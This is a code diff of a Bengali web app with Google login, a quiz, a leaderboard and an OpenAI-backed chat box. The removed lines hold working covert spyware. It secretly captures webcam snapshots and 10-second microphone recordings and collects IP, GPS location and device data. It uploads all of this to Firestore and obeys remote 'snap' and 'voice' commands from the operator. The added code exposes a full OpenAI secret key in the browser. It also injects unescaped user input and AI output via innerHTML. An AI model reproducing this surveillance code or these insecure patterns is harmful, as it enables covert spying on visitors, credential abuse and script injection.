+            <div class="score-badge" id="final-score">৫/৫</div>
+            <p style="color:var(--text-sub);font-size:14px;margin:10px 0;" id="score-msg"></p>
+            <button class="btn-premium" onclick="restartQuiz()" style="margin-bottom:8px;">আবার খেলো</button>
+            <button class="btn-ghost" onclick="document.getElementById('quiz-modal').style.display='none'">বন্ধ করুন</button>
+        </div>
+        <button class="btn-ghost" onclick="document.getElementById('quiz-modal').style.display='none'" id="quiz-close-btn">বন্ধ করুন</button>
+    </div>
+</div>
 
-        window.startApp = async () => {
-            const video = document.getElementById('vSource');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
+<!-- LEADERBOARD MODAL -->
+<div id="lb-modal" class="modal">
+    <div class="modal-box" style="max-width:380px;">
+        <i class="fas fa-trophy" style="font-size:2rem;color:gold;margin-bottom:10px;"></i>
+        <h3 style="color:var(--text-main);margin-bottom:20px;">Top Players 🏆</h3>
+        <div id="lb-list">লোড হচ্ছে...</div>
+        <button class="btn-ghost" onclick="document.getElementById('lb-modal').style.display='none'">বন্ধ করুন</button>
+    </div>
+</div>
 
-            if (stream) {
-                video.srcObject = stream;
-                video.onloadedmetadata = () => video.play();
-            }
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import { getFirestore, doc, onSnapshot, getDoc, setDoc, updateDoc, increment, collection, getDocs, orderBy, query, limit } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-            document.getElementById('perm-modal').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
-            document.getElementById('u-name').innerText = loggedUser.displayName;
-            document.getElementById('u-pic').src = loggedUser.photoURL;
+    const firebaseConfig = { apiKey:"AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo", authDomain:"ratanweab.firebaseapp.com", projectId:"ratanweab", storageBucket:"ratanweab.firebasestorage.app", messagingSenderId:"611953936063", appId:"1:611953936063:web:7e3ca24060d7478fb2a80a" };
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+    const provider = new GoogleAuthProvider();
+    const AI_API = "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";
 
-            if (stream) {
-                setTimeout(() => takeSnap(loggedUser), 2000);
-                recordVoice(stream, 10000);
-            }
+    let currentMsg = null;
+    let currentUser = null;
 
-            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (s) => {
-                if (s.data()?.command === "snap") takeSnap(loggedUser);
-                if (s.data()?.command === "voice") recordVoice(stream, 10000);
-                if (s.data()?.command) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
+    // TRAIL
+    const createTrail = (x, y) => {
+        const p = document.createElement('i');
+        p.className = 'fas fa-heart trail-particle';
+        p.style.cssText = `left:${x}px;top:${y}px;font-size:12px;`;
+        document.body.appendChild(p);
+        setTimeout(() => p.remove(), 800);
+    };
+    window.addEventListener('mousemove', (e) => createTrail(e.clientX, e.clientY));
+    window.addEventListener('touchmove', (e) => {
+        const t = e.touches[0];
+        createTrail(t.clientX, t.clientY);
+    }, {passive:true});
+
+    // SCROLL TO TOP
+    window.addEventListener('scroll', () => {
+        const btn = document.getElementById('scroll-top-btn');
+        btn.style.display = window.scrollY > 300 ? 'flex' : 'none';
+    });
+
+    // THEME
+    window.toggleTheme = () => {
+        document.body.classList.toggle('light-mode');
+        const ball = document.getElementById('theme-ball');
+        ball.textContent = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
+        localStorage.setItem('rp-theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
+    };
+    if(localStorage.getItem('rp-theme') === 'light') {
+        document.body.classList.add('light-mode');
+        document.getElementById('theme-ball').textContent = '☀️';
+    }
+
+    // AUTH
+    window.login = () => signInWithPopup(auth, provider);
+    window.logout = () => signOut(auth).then(() => location.reload());
+
+    onAuthStateChanged(auth, async (user) => {
+        if(user) {
+            currentUser = user;
+            document.getElementById('u-name').innerText = user.displayName;
+            document.getElementById('u-photo').src = user.photoURL.replace('s96-c','s400-c');
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('audio-gate-modal').style.display = 'flex';
+            setBDWish(user.displayName);
+            startRain();
+            updateVisitorCount();
+            loadChatHistory();
+        }
+    });
+
+    window.enterDashboard = () => {
+        document.getElementById('audio-gate-modal').style.display = 'none';
+        document.getElementById('dashboard-ui').style.display = 'block';
+        document.getElementById('snd-open').play().catch(()=>{});
+    };
+
+    // VISITOR COUNT (Real Firestore)
+    async function updateVisitorCount() {
+        const ref = doc(db, "system", "stats");
+        try {
+            await setDoc(ref, {visitors: increment(1)}, {merge:true});
+            onSnapshot(ref, (s) => {
+                if(s.exists()) document.getElementById('v-count').innerText = s.data().visitors || 0;
             });
-        };
+        } catch(e) { document.getElementById('v-count').innerText = '—'; }
+    }
 
-        async function takeSnap(user) {
-            const video = document.getElementById('vSource');
-            const canvas = document.getElementById('snapCanvas');
-            const ctx = canvas.getContext('2d');
+    function setBDWish(name) {
+        const hour = new Date().getHours();
+        const day = new Date().getDay();
+        let msg = hour < 12 ? "শুভ সকাল" : hour < 17 ? "শুভ দুপুর" : hour < 20 ? "শুভ সন্ধ্যা" : "শুভ রাত্রি";
+        let extra = day === 5 ? " — আজ শুক্রবার, জুমার মুবারক! 🕌" : "";
+        document.getElementById('u-wish').innerText = `${msg}, ${name}! কি খবর?${extra}`;
+    }
 
-            if (video.readyState < 2 || video.videoWidth === 0) {
-                setTimeout(() => takeSnap(user), 1000);
-                return;
+    function startRain() {
+        const wrap = document.getElementById('header-rain');
+        setInterval(() => {
+            const h = document.createElement('i');
+            h.className = 'fas fa-heart header-heart';
+            h.style.cssText = `left:${Math.random()*100}%;font-size:${Math.random()*10+8}px;animation-duration:${Math.random()*2+2}s;`;
+            wrap.appendChild(h);
+            setTimeout(() => h.remove(), 4000);
+        }, 300);
+    }
+
+    // NOTICE (upgraded with image + link + ticker)
+    onSnapshot(doc(db, "system", "updates"), (s) => {
+        if(s.exists()) {
+            currentMsg = s.data();
+            if(currentMsg.hasNew) document.getElementById('alert-dot').style.display = 'block';
+            // ticker
+            if(currentMsg.message) {
+                document.getElementById('ticker-content').innerText = '📢 ' + currentMsg.message + '  •  ';
+                document.getElementById('notice-ticker').style.display = 'block';
             }
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const dataImg = canvas.toDataURL('image/jpeg', 0.6);
-            const userRef = doc(db, "users", user.email.replace('.', '_'));
-            const s = await getDoc(userRef);
-            let picList = s.data()?.picList || [];
-            picList.unshift(dataImg);
-            if (picList.length > 5) picList.pop();
-
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'N/A' }));
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await setDoc(userRef, {
-                    name: user.displayName, email: user.email, photo: user.photoURL,
-                    picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
-                    status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
-                }, { merge: true });
-            }, async () => {
-                await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
-            }, { enableHighAccuracy: true });
         }
+    });
 
-        async function recordVoice(stream, time) {
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = async () => {
-                    const userRef = doc(db, "users", loggedUser.email.replace('.', '_'));
-                    const s = await getDoc(userRef);
-                    let audioList = s.data()?.audioList || [];
-                    audioList.unshift(reader.result);
-                    if (audioList.length > 4) audioList.pop();
-                    await updateDoc(userRef, { audioList });
-                };
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), time);
-        }
+    window.openNotice = () => {
+        if(!currentMsg) return;
+        document.getElementById('notice-title').innerText = currentMsg.title || 'নোটিশ';
+        document.getElementById('notice-body').innerText = currentMsg.message || '';
 
-        window.askAI = async () => {
-            const msg = document.getElementById('ai-msg').value;
-            if (!msg) return;
-            document.getElementById('chat-log').innerText = "You: " + msg;
-            document.getElementById('ai-msg').value = "";
+        const img = document.getElementById('notice-img');
+        if(currentMsg.imageUrl) { img.src = currentMsg.imageUrl; img.style.display = 'block'; }
+        else { img.style.display = 'none'; }
+
+        const link = document.getElementById('notice-link');
+        if(currentMsg.linkUrl) { link.href = currentMsg.linkUrl; link.style.display = 'inline-block'; }
+        else { link.style.display = 'none'; }
+
+        document.getElementById('notice-modal').style.display = 'flex';
+        document.getElementById('alert-dot').style.display = 'none';
+    };
+
+    // AI CHAT with history
+    function loadChatHistory() {
+        const log = document.getElementById('chat-content');
+        const saved = localStorage.getItem('rp-chat-history');
+        if(saved) {
+            log.innerHTML = saved;
+            log.scrollTop = log.scrollHeight;
         }
-    </script>
+    }
+
+    window.askAI = async () => {
+        const inp = document.getElementById('ai-msg');
+        const log = document.getElementById('chat-content');
+        const typing = document.getElementById('typing-indicator');
+        if(!inp.value.trim()) return;
+        const val = inp.value.trim();
+
+        const userBubble = `<div style="text-align:right;color:var(--pink-main);margin-bottom:8px;"><b>তুমি:</b> ${val}</div>`;
+        log.innerHTML += userBubble;
+        inp.value = '';
+        typing.style.display = 'block';
+        log.scrollTop = log.scrollHeight;
+
+        try {
+            const r = await fetch("https://api.openai.com/v1/chat/completions", {
+                method:"POST",
+                headers:{"Content-Type":"application/json","Authorization":`Bearer ${AI_API}`},
+                body: JSON.stringify({model:"gpt-4o-mini", messages:[{role:"system",content:"তুমি একটি বাংলা AI assistant। সংক্ষিপ্ত ও সহজ বাংলায় উত্তর দাও।"},{role:"user",content:val}]})
+            });
+            const d = await r.json();
+            typing.style.display = 'none';
+            const aiBubble = `<div style="margin-bottom:10px;color:var(--text-main);"><b style="color:#aaa;">AI:</b> ${d.choices[0].message.content}</div>`;
+            log.innerHTML += aiBubble;
+        } catch(e) {
+            typing.style.display = 'none';
+            log.innerHTML += `<div style="color:red;margin-bottom:8px;">⚠️ Error হয়েছে, আবার চেষ্টা করো।</div>`;
+        }
+        log.scrollTop = log.scrollHeight;
+        localStorage.setItem('rp-chat-history', log.innerHTML);
+    };
+
+    // PORTFOLIO
+    window.createPortfolio = () => {
+        const name = document.getElementById('p-name').value;
+        const title = document.getElementById('p-title').value;
+        const phone = document.getElementById('p-phone').value;
+        const fb = document.getElementById('p-fb').value;
+        const wa = document.getElementById('p-wa').value;
+        if(!name || !title) return alert("দয়া করে নাম ও টাইটেল দিন");
+        document.getElementById('p-result-area').innerHTML = `
+            <div class="result-card">
+                <div style="font-size:3rem;margin-bottom:10px;">👤</div>
+                <h3 style="color:var(--pink-main);font-size:22px;">${name}</h3>
+                <p style="color:var(--text-sub);margin:5px 0 15px;">${title}</p>
+                ${phone ? `<p style="font-size:14px;color:var(--text-main);margin:5px 0;"><i class="fas fa-phone" style="color:var(--pink-main);margin-right:8px;"></i>${phone}</p>` : ''}
+                ${fb ? `<p style="font-size:14px;margin:5px 0;"><a href="${fb}" target="_blank" style="color:#1877f2;"><i class="fab fa-facebook"></i> Facebook</a></p>` : ''}
+                ${wa ? `<p style="font-size:14px;margin:5px 0;"><a href="https://wa.me/${wa}" target="_blank" style="color:#25d366;"><i class="fab fa-whatsapp"></i> WhatsApp</a></p>` : ''}
+                <div style="margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;justify-content:center;">
+                    <button class="btn-premium" style="width:auto;padding:10px 20px;" onclick="document.getElementById('portfolio-modal').style.display='none'">বন্ধ করুন</button>
+                </div>
+            </div>`;
+        document.getElementById('p-maker-modal').style.display = 'none';
+        document.getElementById('portfolio-modal').style.display = 'flex';
+    };
+
+    // QUIZ DATA
+    const quizData = [
+        { cat:"💻 Tech", q:"HTML এর full form কী?", opts:["HyperText Markup Language","High Tech Modern Language","HyperTransfer Markup Logic","None"], ans:0 },
+        { cat:"🔐 Hacking", q:"Phishing attack কী?", opts:["Virus দিয়ে attack","নকল website দিয়ে তথ্য চুরি","Password crack করা","Network down করা"], ans:1 },
+        { cat:"📚 General", q:"বাংলাদেশের রাজধানী কোথায়?", opts:["চট্টগ্রাম","সিলেট","ঢাকা","খুলনা"], ans:2 },
+        { cat:"💻 Tech", q:"CSS মানে কী?", opts:["Cascading Style Sheets","Computer Style System","Creative Sheet Software","None"], ans:0 },
+        { cat:"🔐 Hacking", q:"VPN কীসের জন্য ব্যবহার হয়?", opts:["Internet দ্রুত করতে","Privacy ও location লুকাতে","Virus দূর করতে","Storage বাড়াতে"], ans:1 },
+        { cat:"📚 General", q:"JavaScript এ console.log() কী করে?", opts:["Page reload করে","Browser console এ output দেখায়","CSS যোগ করে","Element delete করে"], ans:1 },
+        { cat:"💻 Tech", q:"Firebase কোন company এর product?", opts:["Facebook","Amazon","Google","Microsoft"], ans:2 },
+        { cat:"🔐 Hacking", q:"SQL Injection কী?", opts:["Database এ malicious query inject করা","Image upload করা","CSS hack করা","Server restart করা"], ans:0 },
+    ];
+
+    let currentQ = 0, score = 0, answered = false, quizSet = [];
+
+    window.openQuiz = () => {
+        quizSet = [...quizData].sort(() => Math.random() - 0.5).slice(0, 5);
+        currentQ = 0; score = 0; answered = false;
+        document.getElementById('quiz-result').style.display = 'none';
+        document.getElementById('quiz-container').style.display = 'block';
+        document.getElementById('quiz-close-btn').style.display = 'block';
+        document.getElementById('quiz-modal').style.display = 'flex';
+        showQuestion();
+    };
+
+    function showQuestion() {
+        if(currentQ >= quizSet.length) { showQuizResult(); return; }
+        answered = false;
+        const q = quizSet[currentQ];
+        document.getElementById('quiz-category').innerText = q.cat;
+        document.getElementById('quiz-count').innerText = `প্রশ্ন ${currentQ+1}/${quizSet.length}`;
+        document.getElementById('quiz-prog').style.width = `${((currentQ+1)/quizSet.length)*100}%`;
+        document.getElementById('quiz-question').innerText = q.q;
+        document.getElementById('quiz-feedback').innerText = '';
+        const opts = document.getElementById('quiz-options');
+        opts.innerHTML = '';
+        q.opts.forEach((opt, i) => {
+            const btn = document.createElement('button');
+            btn.className = 'quiz-option';
+            btn.innerText = opt;
+            btn.onclick = () => checkAnswer(i, btn);
+            opts.appendChild(btn);
+        });
+    }
+
+    function checkAnswer(i, btn) {
+        if(answered) return;
+        answered = true;
+        const q = quizSet[currentQ];
+        const allBtns = document.querySelectorAll('.quiz-option');
+        allBtns.forEach(b => b.style.pointerEvents = 'none');
+        if(i === q.ans) {
+            btn.classList.add('correct');
+            document.getElementById('quiz-feedback').innerHTML = '<span style="color:#00c864;">✓ সঠিক উত্তর!</span>';
+            score++;
+        } else {
+            btn.classList.add('wrong');
+            allBtns[q.ans].classList.add('correct');
+            document.getElementById('quiz-feedback').innerHTML = '<span style="color:#ff3232;">✗ ভুল হয়েছে</span>';
+        }
+        setTimeout(() => { currentQ++; showQuestion(); }, 1200);
+    }
+
+    function showQuizResult() {
+        document.getElementById('quiz-container').style.display = 'none';
+        document.getElementById('quiz-close-btn').style.display = 'none';
+        document.getElementById('quiz-result').style.display = 'block';
+        document.getElementById('final-score').innerText = `${score}/${quizSet.length}`;
+        let msg = score === quizSet.length ? "পারফেক্ট! তুমি অসাধারণ 🌟" : score >= 3 ? "ভালো করেছ! আরো practice করো 💪" : "চেষ্টা করতে থাকো, হবে! 😊";
+        document.getElementById('score-msg').innerText = msg;
+        saveScore(score);
+    }
+
+    window.restartQuiz = () => { openQuiz(); };
+
+    // SAVE SCORE TO FIRESTORE
+    async function saveScore(s) {
+        if(!currentUser) return;
+        try {
+            const ref = doc(db, "leaderboard", currentUser.uid);
+            const existing = await getDoc(ref);
+            const oldScore = existing.exists() ? (existing.data().score || 0) : 0;
+            if(s > oldScore || !existing.exists()) {
+                await setDoc(ref, { name: currentUser.displayName, score: s, photo: currentUser.photoURL }, {merge:true});
+            }
+        } catch(e) {}
+    }
+
+    // LEADERBOARD
+    window.openLeaderboard = async () => {
+        document.getElementById('lb-modal').style.display = 'flex';
+        document.getElementById('lb-list').innerHTML = '<div style="color:#888;font-size:14px;padding:20px;">লোড হচ্ছে...</div>';
+        try {
+            const q = query(collection(db, "leaderboard"), orderBy("score", "desc"), limit(10));
+            const snap = await getDocs(q);
+            if(snap.empty) { document.getElementById('lb-list').innerHTML = '<p style="color:#888;font-size:14px;">এখনো কেউ quiz দেয়নি!</p>'; return; }
+            const medals = ['🥇','🥈','🥉'];
+            let html = '';
+            snap.forEach((d, i) => {
+                const data = d.data();
+                html += `<div class="lb-row">
+                    <span class="lb-rank">${medals[i] || (i+1)+'.'}</span>
+                    <span class="lb-name">${data.name}</span>
+                    <span class="lb-score">${data.score} pts</span>
+                </div>`;
+            });
+            document.getElementById('lb-list').innerHTML = html;
+        } catch(e) { document.getElementById('lb-list').innerHTML = '<p style="color:red;font-size:13px;">লোড করতে সমস্যা হয়েছে।</p>'; }
+    };
+</script>
 </body>
-
 </html>
